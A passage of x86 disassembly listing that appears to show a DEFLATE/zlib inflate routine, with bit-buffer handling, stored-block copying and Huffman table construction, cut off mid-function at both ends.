  407e8b:	0f 92 c1             	setb   %cl
  407e8e:	fe c9                	dec    %cl
  407e90:	83 e1 60             	and    $0x60,%ecx
  407e93:	88 4d 60             	mov    %cl,0x60(%ebp)
  407e96:	66 8b 0e             	mov    (%esi),%cx
  407e99:	83 c6 04             	add    $0x4,%esi
  407e9c:	89 75 34             	mov    %esi,0x34(%ebp)
  407e9f:	eb 1f                	jmp    0x407ec0
  407ea1:	2b 4d 68             	sub    0x68(%ebp),%ecx
  407ea4:	8b 55 70             	mov    0x70(%ebp),%edx
  407ea7:	8b 7d 24             	mov    0x24(%ebp),%edi
  407eaa:	03 c9                	add    %ecx,%ecx
  407eac:	8a 14 11             	mov    (%ecx,%edx,1),%dl
  407eaf:	80 c2 50             	add    $0x50,%dl
  407eb2:	83 45 34 04          	addl   $0x4,0x34(%ebp)
  407eb6:	88 55 60             	mov    %dl,0x60(%ebp)
  407eb9:	8b 55 6c             	mov    0x6c(%ebp),%edx
  407ebc:	66 8b 0c 11          	mov    (%ecx,%edx,1),%cx
  407ec0:	66 89 4d 62          	mov    %cx,0x62(%ebp)
  407ec4:	8b 4d 50             	mov    0x50(%ebp),%ecx
  407ec7:	8b 55 4c             	mov    0x4c(%ebp),%edx
  407eca:	33 f6                	xor    %esi,%esi
  407ecc:	2b c8                	sub    %eax,%ecx
  407ece:	46                   	inc    %esi
  407ecf:	d3 e6                	shl    %cl,%esi
  407ed1:	8b c8                	mov    %eax,%ecx
  407ed3:	d3 ea                	shr    %cl,%edx
  407ed5:	eb 08                	jmp    0x407edf
  407ed7:	8b 4d 60             	mov    0x60(%ebp),%ecx
  407eda:	89 0c 93             	mov    %ecx,(%ebx,%edx,4)
  407edd:	03 d6                	add    %esi,%edx
  407edf:	3b 55 30             	cmp    0x30(%ebp),%edx
  407ee2:	72 f3                	jb     0x407ed7
  407ee4:	8b 4d 28             	mov    0x28(%ebp),%ecx
  407ee7:	8b 75 4c             	mov    0x4c(%ebp),%esi
  407eea:	33 d2                	xor    %edx,%edx
  407eec:	42                   	inc    %edx
  407eed:	d3 e2                	shl    %cl,%edx
  407eef:	eb 04                	jmp    0x407ef5
  407ef1:	33 f2                	xor    %edx,%esi
  407ef3:	d1 ea                	shr    $1,%edx
  407ef5:	85 d6                	test   %edx,%esi
  407ef7:	75 f8                	jne    0x407ef1
  407ef9:	33 c9                	xor    %ecx,%ecx
  407efb:	41                   	inc    %ecx
  407efc:	33 f2                	xor    %edx,%esi
  407efe:	8b d1                	mov    %ecx,%edx
  407f00:	8b c8                	mov    %eax,%ecx
  407f02:	d3 e2                	shl    %cl,%edx
  407f04:	89 75 4c             	mov    %esi,0x4c(%ebp)
  407f07:	4a                   	dec    %edx
  407f08:	23 d6                	and    %esi,%edx
  407f0a:	8b ca                	mov    %edx,%ecx
  407f0c:	8b 55 48             	mov    0x48(%ebp),%edx
  407f0f:	3b 4c 95 a4          	cmp    -0x5c(%ebp,%edx,4),%ecx
  407f13:	74 18                	je     0x407f2d
  407f15:	2b 45 54             	sub    0x54(%ebp),%eax
  407f18:	33 f6                	xor    %esi,%esi
  407f1a:	46                   	inc    %esi
  407f1b:	8b c8                	mov    %eax,%ecx
  407f1d:	d3 e6                	shl    %cl,%esi
  407f1f:	4a                   	dec    %edx
  407f20:	4e                   	dec    %esi
  407f21:	23 75 4c             	and    0x4c(%ebp),%esi
  407f24:	3b 74 95 a4          	cmp    -0x5c(%ebp,%edx,4),%esi
  407f28:	75 eb                	jne    0x407f15
  407f2a:	89 55 48             	mov    %edx,0x48(%ebp)
  407f2d:	83 7d 2c 00          	cmpl   $0x0,0x2c(%ebp)
  407f31:	0f 85 44 fe ff ff    	jne    0x407d7b
  407f37:	ff 45 50             	incl   0x50(%ebp)
  407f3a:	83 45 38 04          	addl   $0x4,0x38(%ebp)
  407f3e:	8b 4d 50             	mov    0x50(%ebp),%ecx
  407f41:	ff 45 28             	incl   0x28(%ebp)
  407f44:	3b 4d 3c             	cmp    0x3c(%ebp),%ecx
  407f47:	0f 8e 1f fe ff ff    	jle    0x407d6c
  407f4d:	85 ff                	test   %edi,%edi
  407f4f:	74 06                	je     0x407f57
  407f51:	83 7d 3c 01          	cmpl   $0x1,0x3c(%ebp)
  407f55:	75 0c                	jne    0x407f63
  407f57:	33 c0                	xor    %eax,%eax
  407f59:	5b                   	pop    %ebx
  407f5a:	5f                   	pop    %edi
  407f5b:	5e                   	pop    %esi
  407f5c:	83 c5 58             	add    $0x58,%ebp
  407f5f:	c9                   	leave
  407f60:	c2 20 00             	ret    $0x20
  407f63:	83 c8 ff             	or     $0xffffffff,%eax
  407f66:	eb f1                	jmp    0x407f59
  407f68:	55                   	push   %ebp
  407f69:	8b ec                	mov    %esp,%ebp
  407f6b:	81 ec 54 0d 00 00    	sub    $0xd54,%esp
  407f71:	8b 45 08             	mov    0x8(%ebp),%eax
  407f74:	8b 08                	mov    (%eax),%ecx
  407f76:	53                   	push   %ebx
  407f77:	8d 58 10             	lea    0x10(%eax),%ebx
  407f7a:	8b 40 04             	mov    0x4(%eax),%eax
  407f7d:	56                   	push   %esi
  407f7e:	8b b3 1c 05 00 00    	mov    0x51c(%ebx),%esi
  407f84:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407f87:	8b 8b a8 9b 00 00    	mov    0x9ba8(%ebx),%ecx
  407f8d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  407f90:	8b 83 a4 9b 00 00    	mov    0x9ba4(%ebx),%eax
  407f96:	3b c8                	cmp    %eax,%ecx
  407f98:	57                   	push   %edi
  407f99:	8b bb 18 05 00 00    	mov    0x518(%ebx),%edi
  407f9f:	c7 45 c4 09 00 00 00 	movl   $0x9,-0x3c(%ebp)
  407fa6:	c7 45 c8 05 00 00 00 	movl   $0x5,-0x38(%ebp)
  407fad:	89 75 d8             	mov    %esi,-0x28(%ebp)
  407fb0:	89 7d dc             	mov    %edi,-0x24(%ebp)
  407fb3:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  407fb6:	73 05                	jae    0x407fbd
  407fb8:	2b c1                	sub    %ecx,%eax
  407fba:	48                   	dec    %eax
  407fbb:	eb 08                	jmp    0x407fc5
  407fbd:	8b 83 a0 9b 00 00    	mov    0x9ba0(%ebx),%eax
  407fc3:	2b c1                	sub    %ecx,%eax
  407fc5:	89 45 ec             	mov    %eax,-0x14(%ebp)
  407fc8:	e9 af 09 00 00       	jmp    0x40897c
  407fcd:	ff 24 85 94 8a 40 00 	jmp    *0x408a94(,%eax,4)
  407fd4:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  407fd8:	0f 84 ae 09 00 00    	je     0x40898c
  407fde:	8b 45 e0             	mov    -0x20(%ebp),%eax
  407fe1:	0f b6 00             	movzbl (%eax),%eax
  407fe4:	ff 4d e4             	decl   -0x1c(%ebp)
  407fe7:	8b cf                	mov    %edi,%ecx
  407fe9:	d3 e0                	shl    %cl,%eax
  407feb:	0b f0                	or     %eax,%esi
  407fed:	ff 45 e0             	incl   -0x20(%ebp)
  407ff0:	83 c7 08             	add    $0x8,%edi
  407ff3:	89 75 d8             	mov    %esi,-0x28(%ebp)
  407ff6:	89 7d dc             	mov    %edi,-0x24(%ebp)
  407ff9:	83 ff 03             	cmp    $0x3,%edi
  407ffc:	72 d6                	jb     0x407fd4
  407ffe:	8b c6                	mov    %esi,%eax
  408000:	83 e0 07             	and    $0x7,%eax
  408003:	8b c8                	mov    %eax,%ecx
  408005:	80 e1 01             	and    $0x1,%cl
  408008:	c1 ee 03             	shr    $0x3,%esi
  40800b:	83 ef 03             	sub    $0x3,%edi
  40800e:	f6 d9                	neg    %cl
  408010:	89 75 d8             	mov    %esi,-0x28(%ebp)
  408013:	89 7d dc             	mov    %edi,-0x24(%ebp)
  408016:	1b c9                	sbb    %ecx,%ecx
  408018:	83 e1 07             	and    $0x7,%ecx
  40801b:	83 c1 08             	add    $0x8,%ecx
  40801e:	d1 e8                	shr    $1,%eax
  408020:	83 e8 00             	sub    $0x0,%eax
  408023:	89 8b 14 05 00 00    	mov    %ecx,0x514(%ebx)
  408029:	0f 84 f4 00 00 00    	je     0x408123
  40802f:	48                   	dec    %eax
  408030:	74 35                	je     0x408067
  408032:	48                   	dec    %eax
  408033:	74 27                	je     0x40805c
  408035:	48                   	dec    %eax
  408036:	0f 85 3a 09 00 00    	jne    0x408976
  40803c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40803f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408042:	c7 03 11 00 00 00    	movl   $0x11,(%ebx)
  408048:	89 b3 1c 05 00 00    	mov    %esi,0x51c(%ebx)
  40804e:	89 bb 18 05 00 00    	mov    %edi,0x518(%ebx)
  408054:	89 41 04             	mov    %eax,0x4(%ecx)
  408057:	e9 cf 09 00 00       	jmp    0x408a2b
  40805c:	c7 03 0b 00 00 00    	movl   $0xb,(%ebx)
  408062:	e9 0f 09 00 00       	jmp    0x408976
  408067:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  40806b:	33 c0                	xor    %eax,%eax
  40806d:	ba 20 01 00 00       	mov    $0x120,%edx
  408072:	3d 8f 00 00 00       	cmp    $0x8f,%eax
  408077:	b1 08                	mov    $0x8,%cl
  408079:	7e 14                	jle    0x40808f
  40807b:	3d 00 01 00 00       	cmp    $0x100,%eax
  408080:	7d 04                	jge    0x408086
  408082:	fe c1                	inc    %cl
  408084:	eb 09                	jmp    0x40808f
  408086:	3d 18 01 00 00       	cmp    $0x118,%eax
  40808b:	7d 02                	jge    0x40808f
  40808d:	b1 07                	mov    $0x7,%cl
  40808f:	0f be c9             	movsbl %cl,%ecx
  408092:	89 8c 85 2c fb ff ff 	mov    %ecx,-0x4d4(%ebp,%eax,4)
  408099:	40                   	inc    %eax
  40809a:	3b c2                	cmp    %edx,%eax
  40809c:	7c d4                	jl     0x408072
  40809e:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4080a1:	50                   	push   %eax
  4080a2:	8d 85 ac f2 ff ff    	lea    -0xd54(%ebp),%eax
  4080a8:	50                   	push   %eax
  4080a9:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4080ac:	50                   	push   %eax
  4080ad:	68 40 9a 40 00       	push   $0x409a40
  4080b2:	68 00 9a 40 00       	push   $0x409a00
  4080b7:	68 01 01 00 00       	push   $0x101
  4080bc:	52                   	push   %edx
  4080bd:	8d 85 2c fb ff ff    	lea    -0x4d4(%ebp),%eax
  4080c3:	50                   	push   %eax
  4080c4:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4080c7:	e8 70 fb ff ff       	call   0x407c3c
  4080cc:	6a 1e                	push   $0x1e
  4080ce:	59                   	pop    %ecx
  4080cf:	6a 05                	push   $0x5
  4080d1:	58                   	pop    %eax
  4080d2:	8d bd 2c fb ff ff    	lea    -0x4d4(%ebp),%edi
  4080d8:	f3 ab                	rep stos %eax,%es:(%edi)
  4080da:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4080dd:	50                   	push   %eax
  4080de:	8d 85 ac f2 ff ff    	lea    -0xd54(%ebp),%eax
  4080e4:	50                   	push   %eax
  4080e5:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4080e8:	50                   	push   %eax
  4080e9:	68 bc 9a 40 00       	push   $0x409abc
  4080ee:	68 80 9a 40 00       	push   $0x409a80
  4080f3:	6a 00                	push   $0x0
  4080f5:	6a 1e                	push   $0x1e
  4080f7:	8d 85 2c fb ff ff    	lea    -0x4d4(%ebp),%eax
  4080fd:	50                   	push   %eax
  4080fe:	8d 45 c8             	lea    -0x38(%ebp),%eax
  408101:	e8 36 fb ff ff       	call   0x407c3c
  408106:	8a 45 c4             	mov    -0x3c(%ebp),%al
  408109:	88 43 10             	mov    %al,0x10(%ebx)
  40810c:	8a 45 c8             	mov    -0x38(%ebp),%al
  40810f:	88 43 11             	mov    %al,0x11(%ebx)
  408112:	8b 45 bc             	mov    -0x44(%ebp),%eax
  408115:	89 43 14             	mov    %eax,0x14(%ebx)
  408118:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  40811b:	89 43 18             	mov    %eax,0x18(%ebx)
  40811e:	e9 36 07 00 00       	jmp    0x408859
  408123:	8b cf                	mov    %edi,%ecx
  408125:	83 e1 07             	and    $0x7,%ecx
  408128:	d3 ee                	shr    %cl,%esi
  40812a:	2b f9                	sub    %ecx,%edi
  40812c:	89 7d dc             	mov    %edi,-0x24(%ebp)
  40812f:	c7 03 09 00 00 00    	movl   $0x9,(%ebx)
  408135:	89 75 d8             	mov    %esi,-0x28(%ebp)
  408138:	e9 39 08 00 00       	jmp    0x408976
  40813d:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  408141:	0f 84 45 08 00 00    	je     0x40898c
  408147:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40814a:	0f b6 00             	movzbl (%eax),%eax
  40814d:	ff 4d e4             	decl   -0x1c(%ebp)
  408150:	8b cf                	mov    %edi,%ecx
  408152:	d3 e0                	shl    %cl,%eax
  408154:	0b f0                	or     %eax,%esi
  408156:	ff 45 e0             	incl   -0x20(%ebp)
  408159:	83 c7 08             	add    $0x8,%edi
  40815c:	89 75 d8             	mov    %esi,-0x28(%ebp)
  40815f:	89 7d dc             	mov    %edi,-0x24(%ebp)
  408162:	83 ff 20             	cmp    $0x20,%edi
  408165:	72 d6                	jb     0x40813d
  408167:	0f b7 c6             	movzwl %si,%eax
  40816a:	89 43 04             	mov    %eax,0x4(%ebx)
  40816d:	33 c0                	xor    %eax,%eax
  40816f:	39 43 04             	cmp    %eax,0x4(%ebx)
  408172:	89 45 dc             	mov    %eax,-0x24(%ebp)
  408175:	89 45 d8             	mov    %eax,-0x28(%ebp)
  408178:	74 05                	je     0x40817f
  40817a:	6a 0a                	push   $0xa
  40817c:	58                   	pop    %eax
  40817d:	eb 06                	jmp    0x408185
  40817f:	8b 83 14 05 00 00    	mov    0x514(%ebx),%eax
  408185:	89 03                	mov    %eax,(%ebx)
  408187:	e9 ea 07 00 00       	jmp    0x408976
  40818c:	33 f6                	xor    %esi,%esi
  40818e:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  408191:	0f 84 f5 07 00 00    	je     0x40898c
  408197:	39 75 ec             	cmp    %esi,-0x14(%ebp)
  40819a:	0f 85 97 00 00 00    	jne    0x408237
  4081a0:	8b 8b a0 9b 00 00    	mov    0x9ba0(%ebx),%ecx
  4081a6:	39 4d e8             	cmp    %ecx,-0x18(%ebp)
  4081a9:	75 27                	jne    0x4081d2
  4081ab:	8b 83 a4 9b 00 00    	mov    0x9ba4(%ebx),%eax
  4081b1:	8d 93 a0 1b 00 00    	lea    0x1ba0(%ebx),%edx
  4081b7:	3b d0                	cmp    %eax,%edx
  4081b9:	74 17                	je     0x4081d2
  4081bb:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4081be:	73 08                	jae    0x4081c8
  4081c0:	2b c2                	sub    %edx,%eax
  4081c2:	48                   	dec    %eax
  4081c3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4081c6:	eb 05                	jmp    0x4081cd
  4081c8:	2b ca                	sub    %edx,%ecx
  4081ca:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4081cd:	39 75 ec             	cmp    %esi,-0x14(%ebp)
  4081d0:	75 65                	jne    0x408237
  4081d2:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4081d5:	8b 75 08             	mov    0x8(%ebp),%esi
  4081d8:	89 83 a8 9b 00 00    	mov    %eax,0x9ba8(%ebx)
  4081de:	e8 f9 f9 ff ff       	call   0x407bdc
  4081e3:	8b b3 a8 9b 00 00    	mov    0x9ba8(%ebx),%esi
  4081e9:	8b 8b a4 9b 00 00    	mov    0x9ba4(%ebx),%ecx
  4081ef:	3b f1                	cmp    %ecx,%esi
  4081f1:	89 75 e8             	mov    %esi,-0x18(%ebp)
  4081f4:	73 07                	jae    0x4081fd
  4081f6:	8b c1                	mov    %ecx,%eax
  4081f8:	2b c6                	sub    %esi,%eax
  4081fa:	48                   	dec    %eax
  4081fb:	eb 08                	jmp    0x408205
  4081fd:	8b 83 a0 9b 00 00    	mov    0x9ba0(%ebx),%eax
  408203:	2b c6                	sub    %esi,%eax
  408205:	8b 93 a0 9b 00 00    	mov    0x9ba0(%ebx),%edx
  40820b:	3b f2                	cmp    %edx,%esi
  40820d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  408210:	75 1d                	jne    0x40822f
  408212:	8d b3 a0 1b 00 00    	lea    0x1ba0(%ebx),%esi
  408218:	3b f1                	cmp    %ecx,%esi
  40821a:	74 13                	je     0x40822f
  40821c:	89 75 e8             	mov    %esi,-0x18(%ebp)
  40821f:	73 07                	jae    0x408228
  408221:	2b ce                	sub    %esi,%ecx
  408223:	49                   	dec    %ecx
  408224:	8b c1                	mov    %ecx,%eax
  408226:	eb 04                	jmp    0x40822c
  408228:	2b d6                	sub    %esi,%edx
  40822a:	8b c2                	mov    %edx,%eax
  40822c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40822f:	85 c0                	test   %eax,%eax
  408231:	0f 84 8a 07 00 00    	je     0x4089c1
  408237:	8b 75 ec             	mov    -0x14(%ebp),%esi
  40823a:	3b 75 e4             	cmp    -0x1c(%ebp),%esi
  40823d:	72 03                	jb     0x408242
  40823f:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  408242:	8b 43 04             	mov    0x4(%ebx),%eax
  408245:	3b c6                	cmp    %esi,%eax
  408247:	73 02                	jae    0x40824b
  408249:	8b f0                	mov    %eax,%esi
  40824b:	56                   	push   %esi
  40824c:	ff 75 e0             	push   -0x20(%ebp)
  40824f:	ff 75 e8             	push   -0x18(%ebp)
  408252:	e8 c0 de ff ff       	call   0x406117
  408257:	01 75 e0             	add    %esi,-0x20(%ebp)
  40825a:	29 75 e4             	sub    %esi,-0x1c(%ebp)
  40825d:	01 75 e8             	add    %esi,-0x18(%ebp)
  408260:	29 75 ec             	sub    %esi,-0x14(%ebp)
  408263:	29 73 04             	sub    %esi,0x4(%ebx)
  408266:	0f 85 0a 07 00 00    	jne    0x408976
  40826c:	e9 0e ff ff ff       	jmp    0x40817f
  408271:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  408275:	0f 84 63 07 00 00    	je     0x4089de
  40827b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40827e:	0f b6 00             	movzbl (%eax),%eax
  408281:	ff 4d e4             	decl   -0x1c(%ebp)
  408284:	8b cf                	mov    %edi,%ecx
  408286:	d3 e0                	shl    %cl,%eax
  408288:	0b f0                	or     %eax,%esi
  40828a:	ff 45 e0             	incl   -0x20(%ebp)
  40828d:	83 c7 08             	add    $0x8,%edi
  408290:	83 ff 0e             	cmp    $0xe,%edi
  408293:	72 dc                	jb     0x408271
  408295:	8b c6                	mov    %esi,%eax
  408297:	25 ff 3f 00 00       	and    $0x3fff,%eax
  40829c:	8b c8                	mov    %eax,%ecx
  40829e:	83 e1 1f             	and    $0x1f,%ecx
  4082a1:	80 f9 1d             	cmp    $0x1d,%cl
  4082a4:	89 43 04             	mov    %eax,0x4(%ebx)
  4082a7:	0f 87 63 07 00 00    	ja     0x408a10
  4082ad:	25 e0 03 00 00       	and    $0x3e0,%eax
  4082b2:	3d a0 03 00 00       	cmp    $0x3a0,%eax
  4082b7:	0f 87 53 07 00 00    	ja     0x408a10
  4082bd:	c1 ee 0e             	shr    $0xe,%esi
  4082c0:	83 ef 0e             	sub    $0xe,%edi
  4082c3:	83 63 08 00          	andl   $0x0,0x8(%ebx)
  4082c7:	c7 03 0c 00 00 00    	movl   $0xc,(%ebx)
  4082cd:	eb 40                	jmp    0x40830f
  4082cf:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4082d3:	0f 84 05 07 00 00    	je     0x4089de
  4082d9:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4082dc:	0f b6 00             	movzbl (%eax),%eax
  4082df:	ff 4d e4             	decl   -0x1c(%ebp)
  4082e2:	8b cf                	mov    %edi,%ecx
  4082e4:	d3 e0                	shl    %cl,%eax
  4082e6:	0b f0                	or     %eax,%esi
  4082e8:	ff 45 e0             	incl   -0x20(%ebp)
  4082eb:	83 c7 08             	add    $0x8,%edi
  4082ee:	83 ff 03             	cmp    $0x3,%edi
  4082f1:	72 dc                	jb     0x4082cf
  4082f3:	8b 4b 08             	mov    0x8(%ebx),%ecx
  4082f6:	0f be 89 ec 99 40 00 	movsbl 0x4099ec(%ecx),%ecx
  4082fd:	8b c6                	mov    %esi,%eax
  4082ff:	83 e0 07             	and    $0x7,%eax
  408302:	89 44 8b 0c          	mov    %eax,0xc(%ebx,%ecx,4)
  408306:	ff 43 08             	incl   0x8(%ebx)
  408309:	c1 ee 03             	shr    $0x3,%esi
  40830c:	83 ef 03             	sub    $0x3,%edi
  40830f:	89 75 d8             	mov    %esi,-0x28(%ebp)
  408312:	89 7d dc             	mov    %edi,-0x24(%ebp)
  408315:	8b 43 04             	mov    0x4(%ebx),%eax
  408318:	c1 e8 0a             	shr    $0xa,%eax
  40831b:	83 c0 04             	add    $0x4,%eax
  40831e:	39 43 08             	cmp    %eax,0x8(%ebx)
  408321:	72 cb                	jb     0x4082ee
  408323:	eb 12                	jmp    0x408337
  408325:	8b 43 08             	mov    0x8(%ebx),%eax
  408328:	0f be 80 ec 99 40 00 	movsbl 0x4099ec(%eax),%eax
  40832f:	83 64 83 0c 00       	andl   $0x0,0xc(%ebx,%eax,4)
  408334:	ff 43 08             	incl   0x8(%ebx)
  408337:	83 7b 08 13          	cmpl   $0x13,0x8(%ebx)
  40833b:	72 e8                	jb     0x408325
  40833d:	8d 55 cc             	lea    -0x34(%ebp),%edx
  408340:	52                   	push   %edx
  408341:	8d 93 20 05 00 00    	lea    0x520(%ebx),%edx
  408347:	52                   	push   %edx
  408348:	33 c9                	xor    %ecx,%ecx
  40834a:	8d 93 10 05 00 00    	lea    0x510(%ebx),%edx
  408350:	52                   	push   %edx
  408351:	51                   	push   %ecx
  408352:	51                   	push   %ecx
  408353:	6a 13                	push   $0x13
  408355:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  408358:	6a 13                	push   $0x13
  40835a:	8d 4b 0c             	lea    0xc(%ebx),%ecx
  40835d:	8d 83 0c 05 00 00    	lea    0x50c(%ebx),%eax
  408363:	51                   	push   %ecx
  408364:	c7 00 07 00 00 00    	movl   $0x7,(%eax)
  40836a:	e8 cd f8 ff ff       	call   0x407c3c
  40836f:	85 c0                	test   %eax,%eax
  408371:	75 16                	jne    0x408389
  408373:	39 83 0c 05 00 00    	cmp    %eax,0x50c(%ebx)
  408379:	74 0e                	je     0x408389
  40837b:	21 43 08             	and    %eax,0x8(%ebx)
  40837e:	c7 03 0d 00 00 00    	movl   $0xd,(%ebx)
  408384:	e9 22 01 00 00       	jmp    0x4084ab
  408389:	c7 03 11 00 00 00    	movl   $0x11,(%ebx)
  40838f:	e9 e2 05 00 00       	jmp    0x408976
  408394:	8b 83 0c 05 00 00    	mov    0x50c(%ebx),%eax
  40839a:	eb 1f                	jmp    0x4083bb
  40839c:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4083a0:	0f 84 38 06 00 00    	je     0x4089de
  4083a6:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4083a9:	0f b6 11             	movzbl (%ecx),%edx
  4083ac:	ff 4d e4             	decl   -0x1c(%ebp)
  4083af:	8b cf                	mov    %edi,%ecx
  4083b1:	d3 e2                	shl    %cl,%edx
  4083b3:	0b f2                	or     %edx,%esi
  4083b5:	ff 45 e0             	incl   -0x20(%ebp)
  4083b8:	83 c7 08             	add    $0x8,%edi
  4083bb:	3b f8                	cmp    %eax,%edi
  4083bd:	72 dd                	jb     0x40839c
  4083bf:	0f b7 04 45 d0 b0 40 	movzwl 0x40b0d0(,%eax,2),%eax
  4083c6:	00 
  4083c7:	8b 8b 10 05 00 00    	mov    0x510(%ebx),%ecx
  4083cd:	23 c6                	and    %esi,%eax
  4083cf:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  4083d2:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  4083d6:	0f b7 40 02          	movzwl 0x2(%eax),%eax
  4083da:	83 f8 10             	cmp    $0x10,%eax
  4083dd:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  4083e0:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4083e3:	73 13                	jae    0x4083f8
  4083e5:	d3 ee                	shr    %cl,%esi
  4083e7:	2b f9                	sub    %ecx,%edi
  4083e9:	8b 4b 08             	mov    0x8(%ebx),%ecx
  4083ec:	89 44 8b 0c          	mov    %eax,0xc(%ebx,%ecx,4)
  4083f0:	ff 43 08             	incl   0x8(%ebx)
  4083f3:	e9 b3 00 00 00       	jmp    0x4084ab
  4083f8:	83 f8 12             	cmp    $0x12,%eax
  4083fb:	75 0c                	jne    0x408409
  4083fd:	6a 07                	push   $0x7
  4083ff:	58                   	pop    %eax
  408400:	c7 45 fc 0b 00 00 00 	movl   $0xb,-0x4(%ebp)
  408407:	eb 2e                	jmp    0x408437
  408409:	83 c0 f2             	add    $0xfffffff2,%eax
  40840c:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  408413:	eb 22                	jmp    0x408437
  408415:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  408419:	0f 84 bf 05 00 00    	je     0x4089de
  40841f:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408422:	0f b6 11             	movzbl (%ecx),%edx
  408425:	ff 4d e4             	decl   -0x1c(%ebp)
  408428:	8b cf                	mov    %edi,%ecx
  40842a:	d3 e2                	shl    %cl,%edx
  40842c:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40842f:	0b f2                	or     %edx,%esi
  408431:	ff 45 e0             	incl   -0x20(%ebp)
  408434:	83 c7 08             	add    $0x8,%edi
  408437:	8d 14 08             	lea    (%eax,%ecx,1),%edx
  40843a:	3b fa                	cmp    %edx,%edi
  40843c:	72 d7                	jb     0x408415
  40843e:	d3 ee                	shr    %cl,%esi
  408440:	2b f9                	sub    %ecx,%edi
  408442:	0f b7 0c 45 d0 b0 40 	movzwl 0x40b0d0(,%eax,2),%ecx
  408449:	00 
  40844a:	23 ce                	and    %esi,%ecx
  40844c:	01 4d fc             	add    %ecx,-0x4(%ebp)
  40844f:	8b c8                	mov    %eax,%ecx
  408451:	2b f8                	sub    %eax,%edi
  408453:	8b 43 04             	mov    0x4(%ebx),%eax
  408456:	8b d0                	mov    %eax,%edx
  408458:	c1 ea 05             	shr    $0x5,%edx
  40845b:	83 e2 1f             	and    $0x1f,%edx
  40845e:	83 e0 1f             	and    $0x1f,%eax
  408461:	8d 84 02 02 01 00 00 	lea    0x102(%edx,%eax,1),%eax
  408468:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40846b:	d3 ee                	shr    %cl,%esi
  40846d:	8b 4b 08             	mov    0x8(%ebx),%ecx
  408470:	03 d1                	add    %ecx,%edx
  408472:	3b d0                	cmp    %eax,%edx
  408474:	0f 87 c2 fb ff ff    	ja     0x40803c
  40847a:	83 7d d0 10          	cmpl   $0x10,-0x30(%ebp)
  40847e:	75 12                	jne    0x408492
  408480:	83 f9 01             	cmp    $0x1,%ecx
  408483:	0f 82 b3 fb ff ff    	jb     0x40803c
  408489:	8b 44 8b 08          	mov    0x8(%ebx,%ecx,4),%eax
  40848d:	89 45 d0             	mov    %eax,-0x30(%ebp)
  408490:	eb 04                	jmp    0x408496
  408492:	83 65 d0 00          	andl   $0x0,-0x30(%ebp)
  408496:	8d 44 8b 0c          	lea    0xc(%ebx,%ecx,4),%eax
  40849a:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40849d:	89 10                	mov    %edx,(%eax)
  40849f:	41                   	inc    %ecx
  4084a0:	83 c0 04             	add    $0x4,%eax
  4084a3:	ff 4d fc             	decl   -0x4(%ebp)
  4084a6:	75 f2                	jne    0x40849a
  4084a8:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4084ab:	8b 43 04             	mov    0x4(%ebx),%eax
  4084ae:	8b c8                	mov    %eax,%ecx
  4084b0:	c1 e9 05             	shr    $0x5,%ecx
  4084b3:	83 e1 1f             	and    $0x1f,%ecx
  4084b6:	83 e0 1f             	and    $0x1f,%eax
  4084b9:	8d 84 01 02 01 00 00 	lea    0x102(%ecx,%eax,1),%eax
  4084c0:	39 43 08             	cmp    %eax,0x8(%ebx)
  4084c3:	0f 82 cb fe ff ff    	jb     0x408394
  4084c9:	8b 43 04             	mov    0x4(%ebx),%eax
  4084cc:	83 a3 10 05 00 00 00 	andl   $0x0,0x510(%ebx)
  4084d3:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4084d7:	8b c8                	mov    %eax,%ecx
  4084d9:	c1 e8 05             	shr    $0x5,%eax
  4084dc:	83 e0 1f             	and    $0x1f,%eax
  4084df:	83 e1 1f             	and    $0x1f,%ecx
  4084e2:	ba 01 01 00 00       	mov    $0x101,%edx
  4084e7:	03 ca                	add    %edx,%ecx
  4084e9:	40                   	inc    %eax
  4084ea:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4084ed:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4084f0:	50                   	push   %eax
  4084f1:	8d 83 20 05 00 00    	lea    0x520(%ebx),%eax
  4084f7:	50                   	push   %eax
  4084f8:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4084fb:	50                   	push   %eax
  4084fc:	68 40 9a 40 00       	push   $0x409a40
  408501:	68 00 9a 40 00       	push   $0x409a00
  408506:	52                   	push   %edx
  408507:	51                   	push   %ecx
  408508:	8d 43 0c             	lea    0xc(%ebx),%eax
  40850b:	50                   	push   %eax
